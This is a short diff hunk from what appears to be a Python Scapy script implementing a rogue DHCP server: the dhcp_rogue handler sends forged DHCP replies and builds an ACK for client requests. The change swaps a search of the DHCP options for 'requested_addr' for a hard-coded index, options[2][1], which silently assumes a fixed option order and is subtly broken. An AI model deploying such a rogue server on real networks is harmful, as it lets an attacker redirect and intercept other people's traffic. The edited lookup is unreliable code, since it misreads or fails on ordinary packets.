@@ -41,7 +41,7 @@ def dhcp_rogue(pkt):
             sendp(reply, iface=eth, verbose=False)
 
         elif msg_type == 3:
-            requested_ip = next((opt[1] for opt in pkt[DHCP].options if opt[0] == 'requested_addr'), None)
+            requested_ip = pkt[DHCP].options[2][1]
             print(f"DHCP_REQUEST for {requested_ip}")
             
             ack = (
